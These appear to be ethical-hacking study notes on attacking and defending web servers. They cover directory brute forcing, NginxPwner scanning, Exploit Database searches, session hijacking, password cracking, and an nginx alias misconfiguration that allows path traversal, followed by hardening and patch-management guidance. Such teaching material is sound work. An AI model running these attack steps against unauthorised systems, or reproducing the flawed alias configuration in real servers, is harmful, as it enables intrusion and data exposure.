				- Sample Scripts and Demonstration Functionalities: Many web servers contain sample scripts and pages designed to demonstrate application server features and APIs. Often, these scripts are not properly secured and may contain vulnerabilities that attackers can exploit. Additionally, some demonstration functionalities may include exploitable features that attackers can leverage.
				- Publicly Accessible Powerful Functions: Some web servers include powerful administrative functionalities that should be restricted from public access. However, attackers often attempt to exploit these functions to compromise the server. For example, certain application servers allow web archives to be deployed over the same HTTP port used by the application. Attackers may use tools like Metasploit to scan for default passwords, upload backdoors, and gain command-shell access to the target server.
				- Server Installation Manuals: Attackers seek out publicly accessible server installation manuals, as they may contain crucial details about server configurations and setup processes. Access to this information helps attackers prepare targeted exploitation strategies against the installed web server.
			- Tools for Identifying Default Content - Nikto2 (cirt.net): Nikto is a widely used vulnerability scanner that helps identify security weaknesses in web applications and web servers, including default content that could be exploited by attackers.
		- Directory Brute Forcing:
			- When a web server receives a request for a directory rather than a specific file, it may respond in one of the following ways:
				- Return a Default Resource: The server may return a default resource within the directory, such as index.html.
				- Return an Error: The server may return an error, such as an HTTP status code 403, indicating that access is not permitted.
				- Return a Directory Listing: The server may return a directory listing showing the contents of the requested directory. A sample directory listing is shown in the screenshot.
			- Security Risks of Directory Listings:
				- While directory listings are not inherently a major security risk, they can sometimes expose vulnerabilities that attackers can exploit, including:
				- Improper Access Controls – Misconfigured permissions may allow unauthorized access to sensitive files.
				- Unintentional Access to the Web Root – Attackers may gain access to critical files and directories that should remain hidden.
			- Attack Techniques:
				- After discovering a directory on a web server, an attacker will attempt to access its listing by sending a request to that directory. Attackers also target vulnerable web server software that improperly grants access to directory listings. To automate these attacks, they use tools like Dirhunt and Sitechecker Website Directory Scanner to scan for exposed directories on a target web server.
			- Tools for Directory Brute Forcing - Dirhunt (github.com):
				- Dirhunt is a web crawler optimized for searching and analyzing directories. It is particularly useful when a server has the "index of" mode enabled. Additionally, Dirhunt can detect directories even when directory listing is disabled, by identifying:
					- False 404 errors
					- Directories with empty index files used to hide content
					- Other misconfigurations that reveal hidden resources
	- Website Mirroring:
		- Website mirroring is a technique used to copy an entire website and its content onto another server for offline browsing. By creating a mirrored version of a website, an attacker can analyze its structure in detail, potentially identifying vulnerabilities and sensitive information.
	- Vulnerability Scanning:
		- Vulnerability scanning is the process of identifying security weaknesses and misconfigurations in a target web server or network. It helps uncover potential vulnerabilities that attackers can exploit in a web server attack.
		- During the vulnerability scanning phase, attackers use sniffing techniques to monitor network traffic, allowing them to identify active systems, network services, and running applications. Automated tools, such as Acunetix Web Vulnerability Scanner, are commonly used to scan target servers for vulnerabilities, detect active hosts and services, and identify security flaws.
		- Vulnerability Scanning Tools:
			- Acunetix Web Vulnerability Scanner:
				- Acunetix Web Vulnerability Scanner (WVS) is a powerful tool for detecting vulnerabilities in web applications. It checks for security issues such as SQL injection, Cross-Site Scripting (XSS), and other web-based attacks.

		- Nginx Vulnerability Scanning Using NginxPwner:
			- NginxPwner is a Python-based tool designed to identify common misconfigurations and vulnerabilities in Nginx web servers. It automates the process of detecting security issues, such as misconfigured HTTP methods, improper file permissions, outdated software versions, and insecure default settings. By using this tool, security professionals can quickly gather detailed information on potential entry points and weaknesses in an Nginx setup, helping to improve security defenses.
			- Steps to Scan an Nginx Web Server for Vulnerabilities:
				- Create a temporary file to store a list of potential URL paths acquired via crawling or other methods: nano /tmp/pathlist
				- Insert the paths into this file, then save and exit using CTRL+X.
				- Execute the NginxPwner script, specifying the target URL and the path file: python3 nginxpwner.py <target_URL> /tmp/pathlist
				- Replace <target_URL> with the actual target URL and /tmp/pathlist with the path to your list file.
				- Analyze the output provided by NginxPwner to identify potential vulnerabilities and misconfigurations in the target Nginx server.
		- Finding Exploitable Vulnerabilities:
			- Flaws and programming errors in software design lead to security vulnerabilities. Many public vulnerability repositories available online provide access to information about various software vulnerabilities. Attackers often search exploit sites such as Packet Storm (packetstormsecurity.com) and the Exploit Database (www.exploit-db.com) for vulnerabilities affecting a web server based on its OS and software applications.
			- Using the information gathered in previous stages, attackers identify relevant vulnerabilities through the Exploit Database. Exploiting these vulnerabilities allows them to execute commands or binaries on a target machine, escalate privileges, or bypass security mechanisms. In some cases, attackers can even gain access to privileged user accounts and credentials.
			- Finding Exploitable Web Server Vulnerabilities Using Exploit Database (www.exploit-db.com):
				- Visit the Exploit Database Website and Navigate to the Exploit Database website.
				- Use the Search Functionality - Enter keywords related to the target web server in the search bar (e.g., "Apache," "IIS," "nginx").

				- Verify the Vulnerability - Cross-check the identified vulnerabilities with the versions and configurations of the target web server to ensure applicability.
				- Download and Test Exploits - If relevant, download the exploit code and test it in a controlled environment to verify its effectiveness.
	- Session Hijacking:
		- Attackers can perform session hijacking by identifying an active client session and taking complete control of it. Through session hijacking, an attacker can gain unauthorized access to a web server and intercept sensitive data by exploiting valid session IDs.
		- Various techniques can be used to hijack or steal session data, including:
			- Session Token Prediction – Guessing or predicting session tokens based on weak randomness.
			- Session Replay – Reusing captured session tokens to gain access.
			- Session Fixation – Forcing a user to authenticate with a known session ID.
			- Sidejacking – Intercepting session cookies over insecure networks.
			- Cross-Site Scripting (XSS) – Injecting malicious scripts to steal session tokens.
		- Attackers use tools such as Burp Suite, JHijack, and Ettercap to automate session hijacking.
		- Session Hijacking Tools:
			- Burp Suite (portswigger.net): Burp Suite is a web security testing tool that can analyze and hijack session IDs in active sessions. The Sequencer tool in Burp Suite evaluates the randomness of session tokens. Attackers can use this tool to predict session tokens and take over valid sessions.
			- JHijack (sourceforge.net)
			- Ettercap (www.ettercap-project.org)
	- Web Server Password Hacking:
		- In this phase of web server hacking, an attacker attempts to crack web server passwords using various password-cracking techniques. These may include password guessing, dictionary attacks, brute-force attacks, hybrid attacks, precomputed hashes, rule-based attacks, distributed network attacks, and rainbow table attacks.
		- Since some of these methods are tedious and time-consuming, attackers often require patience. To expedite the process, attackers can use automated tools such as Hashcat, THC Hydra, and Ncrack to crack web passwords and hashes.
		- Hashcat (hashcat.net):
			- Hashcat is a password-cracking tool compatible with multiple operating systems and platforms. It supports multi-hash cracking (MD4, MD5, SHA-224, SHA-256, SHA-384, SHA-512, RIPEMD-160, etc.) and multi-device processing.
			- The tool offers several attack modes, including: Straight attack, Combination attack, Brute-force attack, Hybrid dictionary + mask attack, Hybrid mask + dictionary attack

			- Ncrack (nmap.org)
			- Rainbow Crack (project-rainbowcrack.com)
			- Wfuzz (www.edge-security.com)
			- Wireshark (www.wireshark.org)
	- Using an Application Server as Proxy:
		- Web servers are sometimes configured to function as forwarding or reverse HTTP proxies. When these functionalities are enabled, attackers can exploit them to:
			- Attack third-party systems on the internet
			- Connect to arbitrary hosts within an organization’s internal network
			- Establish connections to other services running on the proxy host itself
		- To leverage vulnerable web servers as proxies, attackers commonly use GET and CONNECT requests to connect to target systems and extract information through the compromised web servers.
	- Path Traversal via Misconfigured NGINX Alias:
		- An attacker can exploit a misconfiguration in the nginx.conf file of a targeted Nginx web server, particularly due to the improper usage of the alias directive. This vulnerability arises when the alias directive is used without a trailing slash, as shown in the following misconfigured example:
			- Webroot Misconfiguration in nginx.conf:
				location /i {  
					alias /data/w3/images/;  
				}
			- In this scenario, the absence of a trailing slash (/) allows attackers to manipulate the URL to access directories and files outside the designated web root. By appending traversal sequences such as ../, attackers can navigate the file system to restricted locations, potentially exposing sensitive data or system files.
		- Exploiting This Vulnerability Using Kyubi (github.com):
			- Kyubi is a Python-based security tool designed to detect and exploit path traversal vulnerabilities in Nginx web servers caused by misconfigured alias directives. It automates the process of testing URL paths for potential traversal weaknesses.
			- Kyubi recursively brute-forces the URL path to identify and list files or directories that may be exposed due to misconfigurations.
		- Potential Impact of Exploiting This Misconfiguration:
			- If successfully exploited, this vulnerability can allow attackers to access sensitive files outside the web root, including configuration files and credentials. This can lead to severe consequences such as:
				- Data theft – Exposure of sensitive business or user information.
				- Website defacement – Unauthorized modification of website content.
				- Complete server compromise – Gaining access to critical system files and escalating privileges.
			- Proper configuration of the alias directive with a trailing slash (/) is essential to prevent path traversal attacks and secure Nginx web servers.

		- Implement version control for web application files to track changes and enable rollbacks.
	- Detecting Web Server Hacking Attempts:
		- An attacker exploiting web server vulnerabilities may plant backdoors to maintain access, launch phishing attacks, or send spam. Victims often remain unaware until the server is blacklisted or visitors are redirected to malicious sites. Detecting such attacks is difficult until significant damage occurs, making early detection crucial for protection.
		- Website Change Detection System (WDS):
			- When an attacker installs a backdoor on a web server, the size of infected files increases.
			- A Website Change Detection System (WDS) is a script that runs on the server to monitor modifications to executable files or the addition of new files, including HTML, JavaScript (JS), PHP, Active Server Pages (ASP), Perl, and Python files.
			- WDS operates by periodically comparing the hash values of server files with their corresponding master hash values to detect unauthorized changes to the codebase. If any modifications are detected, the system alerts the user to take necessary action. Thus, WDS plays a critical role in identifying web server hacking attempts at an early stage.
			- For example, DirectoryMonitor is an automated tool that scans web directories, detects changes in the codebase, and notifies the user via email.
	- Defend Against Web Server Attacks:
		- Ports:
			- Regularly monitor all ports on the web server to prevent unnecessary traffic. Unmonitored traffic can leave the server vulnerable to malware attacks.
			- Public access to port 80 (HTTP) and port 443 (HTTPS) should be restricted. Traffic to these ports should be carefully controlled.
			- If port 80 remains open, the server is at risk of Denial-of-Service (DoS) attacks, which can overload and consume server resources.
			- Intranet traffic should be either encrypted or restricted to enhance security.
			- Attackers often attempt to spoof IP addresses to conceal their identity. To counter this:
				- Security logs should be analyzed to detect suspicious activity.
				- Firewall rules can be configured with a "deny this IP address" rule to block malicious sources.
				- A routed blackhole command can be used to drop malicious traffic and prevent it from reaching the target system.
		- Server Certificates:
			- Server certificates enhance security and are issued by a trusted authority. However, attackers may compromise certified servers by using forged certificates to intercept secure communications through Man-in-the-Middle (MITM) attacks. To mitigate such risks, the following techniques can be used:
			- Direct certificate validation to verify authenticity.
			- Alternative protocols that do not rely on third-party certificate validation.
			- Domain-based certificate verification, allowing domains to securely inspect their own certificates using pre-established user authentication credentials.
			- Strong cryptographic techniques that improve server identity validation and address the limitations of third-party solutions.
			- Ensuring certificate validity, including checking expiration dates and confirming that certificates are used for their intended purpose.
			- Verifying certificate revocation status, ensuring the certificate’s public key remains valid and is traceable to a trusted root authority.
		- Machine.config:
			- The machine.config file provides a mechanism for securing information by modifying machine-level settings. These settings impact all applications running on the system. The machine.config file includes configuration settings for the .NET Framework, which influence security.
			- The following security measures should be implemented using the machine.config file:
				- Map protected resources to HttpForbiddenHandler and remove any unused HttpModules.
				- Disable tracing (<trace enabled="false"/>) and ensure that debug compilation is turned off.
				- Prevent ASP.NET errors from being exposed to clients.
				- Verify session state settings to ensure proper security configurations.
		- Code Access Security:
			- Adopt secure coding practices to prevent source code disclosure and input validation attacks.
			- Restrict code access security policies to ensure that no permissions are granted for executing code downloaded from the Internet or intranet.
			- Configure IIS to:
				- Reject URLs containing "../" to prevent path traversal attacks.
				- Lock down system commands and utilities using restrictive access control lists (ACLs).
				- Regularly install security patches and updates.
			- Enforce code access security on web servers to prevent the execution of malicious code.
			- Failure to implement these measures can leave web servers vulnerable to attacks that exploit insecure code execution.
		- Restrict Access and Permissions:
			- Apply restricted ACLs and block remote registry administration.
			- Secure the SAM (for stand-alone servers).
			- Harden NTFS permissions for the metabase file, shared folders, and website directories.
			- Remove unnecessary file shares, including default admin shares, if not required.
			- Restrict directory listings and enforce proper file permissions.
			- Limit server functionality to only required web technologies.
		- Harden Web Server Configuration:
			- Remove unnecessary IIS script mappings and ISAPI filters.
			- Relocate websites and virtual directories to non-system partitions.
			- Do not install IIS on a domain controller.
			- Use a dedicated machine for the web server.
			- Turn off unused features, such as server-side scripting and directory browsing.
			- Configure separate anonymous user accounts for different applications.
		- Enhance Network Security:
			- Implement firewalls to control incoming and outgoing traffic.
			- Use network segmentation, VPNs, and secure protocols (e.g., HTTPS) to limit unauthorized access.
			- Screen and filter incoming traffic requests.
			- Deploy IDPS to monitor and detect malicious activity.
		- Secure Authentication and Sessions:
			- Use server-side session ID tracking and match connections with timestamps, IP addresses, etc.
			- Implement role-based access control (RBAC) and least privilege principles.
		- Protect Data and Logs:
			- Store website files and scripts on a separate partition or drive.
			- Enable minimum-level auditing and use NTFS permissions to protect log files.
			- Implement centralized log monitoring to track activities and analyze logs for suspicious behavior.
			- Set up alerts for security events and establish an incident response plan.
		- Physical and Environmental Security:
			- Physically secure the web server in a restricted machine room.
			- Prevent local logins except for administrators.
		- Security Tools and Automation:
			- Use security tools provided with web server software.
			- Deploy scanners that automate web server security checks.
			- Implement an anti-bot mitigation service (e.g., DataDome) to detect botnets in real time.
	- Defend Against HTTP Response Splitting and Web Cache Poisoning:
		- When setting cookies, remove carriage returns (CRs) and line feeds (LFs) before inserting data into an HTTP response header. The best practice is to use third-party security tools to test for vulnerabilities and defend against CRLF injection. Ensure that application engines are up to date.
		- The User Datagram Protocol (UDP) source port randomization technique helps protect servers from blind response forgery. Limit the number of simultaneous recursive queries and increase the time-to-live (TTL) values of legitimate records.
		- Methods to Defend Against HTTP Response Splitting and Web Cache Poisoning:
			- Server Administration:
				- Use the latest web server software.
				- Regularly update and patch the operating system (OS) and web server.
				- Run a web vulnerability scanner.
			- Application Development:
				- Restrict the web application’s access to unique IP addresses.
				- Disallow carriage return (%0D or \r) and line feed (%0A or \n) characters.
				- Comply with RFC 2616 specifications for HTTP/1.1.
				- Parse all user inputs and other forms of encoding before using them in HTTP headers.
			- Proxy Servers:
				- Avoid sharing incoming TCP connections among different clients.
				- Use separate TCP connections with the proxy for different virtual hosts.
				- Implement the "maintain request host header" feature correctly.
	- Defend Against DNS Hijacking:
		- Secure Domain Registration: Choose an ICANN-accredited registrar and enable REGISTRAR-LOCK on your domain.
		- Account & Access Protection: Safeguard registrant credentials, enforce strong password policies, and use multifactor authentication (MFA) and role-based access control (RBAC) for DNS management.
		- DNSSEC Implementation: Deploy Domain Name System Security Extensions (DNSSEC) to prevent unauthorized DNS modifications.
		- Network & Router Security: Change the default router username and password, keep firmware updated, and restrict access to DNS servers based on trusted IP addresses.
		- Monitoring & Alerts: Use DNS monitoring tools to detect unauthorized changes and configure geolocation-based alerts for unusual access.
		- Restrict DNS Access: Use Access Control Lists (ACLs) to limit who can query your DNS servers and restrict zone transfers to trusted sources.
		- Encrypted DNS Queries: Enable DNS over HTTPS (DoH) or DNS over TLS (DoT) to encrypt DNS traffic and prevent interception.
		- DNS Service Provider Security: Choose reliable DNS providers (e.g., Cloudflare, Google Public DNS) with strong service-level agreements (SLAs) and security features.
		- Firewalls & Filtering: Implement firewall protection to filter rogue DNS traffic and use DNS filtering services to block malicious domains.
		- VPN Security: Use reputable VPN services instead of free ones, which may log activities, and establish encrypted VPN tunnels for secure communication.
		- Software & Browser Protection: Install and update antivirus software, use script blockers, and avoid downloading untrusted software.
		- Redundant & Isolated DNS Infrastructure: Set up a master-slave DNS architecture, keeping the master offline and allowing only verified updates.
		- Incident Response Planning: Include DNS hijacking mitigation in business continuity and security response plans.

		- Mitmprox (mitmproxy.org)
- Patch Management:
	- Developers constantly strive to identify and fix bugs in web servers. These fixes are distributed as patches, which help protect against known vulnerabilities. However, unpatched systems or improperly applied patches can create security loopholes.
	- Patch:
		- A patch is a small piece of software designed to fix problems, address security vulnerabilities, and improve the usability or performance of a computer program or its supporting data. It acts as a repair for programming issues. A software vulnerability is a weakness in a program that makes it susceptible to malware attacks. To mitigate these risks, software vendors release patches that help prevent exploits and reduce the likelihood of threats taking advantage of specific vulnerabilities.
		- Patches typically include fixes and updates for multiple known bugs or issues. They are publicly released updates available to all customers. A system without regular patch updates is far more vulnerable to attacks. If an attacker discovers a vulnerability before it is patched, the system may be at risk of malware attacks.
	- Hotfix:
		- A hotfix is a package designed to address a critical defect in a live environment. Unlike patches, a hotfix targets a single issue and is applied to a specific product version. Hotfixes provide quick solutions to urgent problems and ensure that critical issues are resolved promptly.
		- Hotfixes should be applied to software patches on production systems. Vendors notify users about the latest hotfixes through email or by making them available on their official website. Unlike patches, hotfixes often address specific customer-reported issues and are not always distributed publicly. Occasionally, vendors release a collection of hotfixes as a combined hotfix or service pack to provide a broader set of fixes.
	- Patch Management:
		- Patch management is a critical aspect of systems management that involves acquiring, testing, and installing multiple patches (code changes) on an administered computer system. It serves as a defense mechanism against vulnerabilities that can cause security weaknesses or data corruption. The process includes scanning for network vulnerabilities, detecting missing security patches and hotfixes, and deploying the necessary patches as soon as they become available to secure the network.
		- Key tasks involved in patch management include:
			- Selecting, verifying, testing, and applying patches
			- Updating previously applied patches with current versions
			- Maintaining a record of patches applied to software
			- Storing repositories or depots of patches for easy access
			- Assigning and deploying patches to relevant systems
		- Automated Patch Management Process:
			- An automated patch management system follows these steps:
				- Detect: Use tools to identify missing security patches.
				- Assess: Evaluate the issue and its severity, considering mitigating factors that may influence the decision.
				- Acquire: Download the patch for testing.
				- Test: Install the patch on a test machine to verify its effects before deployment.
				- Deploy: Apply the patch to computers while ensuring it does not disrupt applications.
				- Maintain: Subscribe to notifications about newly reported vulnerabilities to stay updated.
			- This structured approach ensures that systems remain secure and up to date while minimizing risks associated with patch deployment.
	- Installation of Patch:
		- Identifying Appropriate Sources for Updates and Patches:
			- It is crucial to obtain updates and patches from trusted sources. Installing patches from unverified sources can make the target server more vulnerable to attacks instead of strengthening its security. Therefore, selecting reliable sources plays a vital role in securing web servers.
			- To identify appropriate sources for updates and patches:
				- Develop a patch management plan that aligns with the operational environment and business objectives.
				- Obtain updates and patches directly from the official websites of application or operating system vendors.
				- Register on vendor websites to receive alerts and notifications about relevant updates for proactive patch management.
		- Installation Methods for Patch:
			- Security patches can be accessed and installed via the internet using two methods:
			- Manual Installation – The user downloads the patch from the vendor’s website and installs it manually.
			- Automatic Installation – Applications use an auto-update feature to install patches automatically.
		- Implementation and Verification of Security Patch or Upgrade:
			- Before and after installing a patch, proper validation and monitoring are necessary to ensure security and functionality:
			- Verify the source of the patch before installation.
			- Use a patch management program to validate file versions and checksums before deployment.
			- Ensure that the patch management tool can monitor patched systems effectively.
			- The patch management team should regularly check for updates and patches to keep systems secure.
	- Patch Management Best Practices:
		- Define roles, responsibilities, and procedures for patch management, including timelines and emergency handling.
		- Develop a comprehensive policy for evaluating, testing, approving, and deploying patches.
		- Maintain an updated inventory of all hardware and software to ensure complete coverage.
		- Assess and prioritize patches based on vulnerability severity and asset criticality.
		- Use automation tools to discover, track, and apply patches efficiently.
		- Implement a testing process in a controlled environment to verify patch compatibility and prevent system issues.
		- Establish a regular patching schedule while allowing fast-tracked deployment for critical vulnerabilities.
		- Stay informed on new vulnerabilities and patches through security advisories and feeds.
		- Limit access to patch management tools to authorized personnel.
		- Ensure systems are backed up before patching to facilitate recovery if needed.
		- Verify that patches are successfully applied and functioning as intended.
		- Conduct regular vulnerability scans to identify and address unpatched systems.
		- Protect patch management systems from attacks to prevent compromise.
		- Regularly review and refine patch management processes for continuous improvement.
		- Include third-party applications in the patching strategy.
		- Have a rollback plan in case patches cause unforeseen issues.

# Hacking Web Applications

- Web Applications:
	- Web applications are software programs that run on web browsers, acting as interfaces between users and web servers. They generate dynamic web pages or execute scripts within the client’s browser, enabling users to interact with databases via a graphical user interface (GUI).
	- Despite security measures, web applications remain vulnerable to threats like SQL injection, cross-site scripting, and session hijacking. Users interact with them using a keyboard, mouse, or touch interface. Built on languages like JavaScript, HTML, and CSS, web applications work with server-side languages like SQL to manage data. They facilitate tasks such as searching, emailing, social networking, online shopping, and order tracking. Some desktop applications also integrate web-based functionalities for enhanced flexibility.
	- Web Application Architecture:
		- Web applications run on web browsers and utilize a combination of server-side scripts (e.g., Java, C#, Ruby, PHP) and client-side scripts (e.g., HTML, JavaScript) to function. The performance of a web application depends on its architecture, which consists of hardware and software that handle tasks such as processing requests, retrieving data, and displaying the required information.
		- Web application architecture involves various devices, web browsers, and external web services that interact with different scripting languages to execute the application. It is typically structured into three layers:
		- Client or Presentation Layer:
			- The client or presentation layer includes all physical devices on the user side, such as laptops, smartphones, and desktop computers. These devices run operating systems and compatible web browsers that allow users to send requests for web applications. When a user enters a URL in the browser, the request is sent to the web server, which processes it, retrieves the required data, and returns a response. This response is then displayed in the browser as a web page.
		- Business Logic Layer:
			- The business logic layer is divided into two sublayers:
			- Web Server Logic Layer:
				- This layer consists of components such as:
				- A firewall that provides security for web content.
				- An HTTP request parser that processes incoming client requests and forwards responses.
				- A proxy caching server that optimizes performance by storing frequently accessed data.
				- An authentication and login handler that manages user authentication.
				- A resource handler that efficiently processes multiple requests.
				- A hardware component (e.g., a physical or cloud-based server).
			- The web server logic layer includes code responsible for handling client requests and returning appropriate responses (e.g., IIS Web Server, Apache Web Server).
			- Business Logic Layer:
				- This layer contains the core functional logic of the web application, implemented using technologies such as .NET, Java, and middleware solutions. It governs data flow and defines the application's behavior. Developers build applications based on this logic using various programming languages. Additionally, this layer manages data storage and facilitates integration with legacy systems while incorporating modern functionalities. The server must use a specific protocol to retrieve user-requested data from the database.
		- Database Layer:
			- The database layer includes:
				- Cloud services for scalable data storage.
				- A B2B layer that manages commercial transactions.
				- A database server that stores and organizes an organization's data in a structured manner (e.g., MS SQL Server, MySQL Server).
			- This layer ensures efficient data management, retrieval, and security for web applications.
